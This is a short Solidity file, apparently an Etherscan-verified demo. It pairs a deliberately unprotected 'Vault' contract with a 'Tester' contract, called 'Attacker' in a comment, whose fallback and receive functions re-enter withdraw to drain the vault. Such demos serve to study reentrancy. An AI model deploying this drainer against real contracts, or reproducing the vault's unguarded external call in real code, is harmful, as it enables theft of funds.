/**
 *Submitted for verification at Etherscan.io on 2021-08-07
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.6.0 <0.8.0;

contract Vault {
  event Deposited(uint256 amount);
  event Withdrew(address recipient, uint256 amount);
    
  uint private withdrawableBalance = 0.01 ether;

  function withdraw() external {
    (bool success,) = msg.sender.call{value:withdrawableBalance}("");
    emit Withdrew(msg.sender, withdrawableBalance);
    if (!success) {
      revert();
    }
  }

  function deposit() public payable {
    emit Deposited(msg.value);
  }
}

contract Tester {
  event Falledback(uint256 amount);
  event Received(uint256 amount);

  address private _owner;
  Vault private _target;
  
  constructor() {
    _owner = msg.sender;
  }

  function test(address target) public {
    _target = Vault(target);
    _target.withdraw();
  }

  // Fallback function which is called whenever Attacker receives ether
  fallback() external payable {
    emit Falledback(msg.value);
    if (address(_target).balance >= msg.value) {
      _target.withdraw();
    }
  }
  
  receive() external payable {
    emit Received(msg.value);
    if (address(_target).balance >= msg.value) {
      _target.withdraw();
    }
  }
  
  function withdraw(uint256 amount) public {
    _owner.call{value:amount}("");
  }
}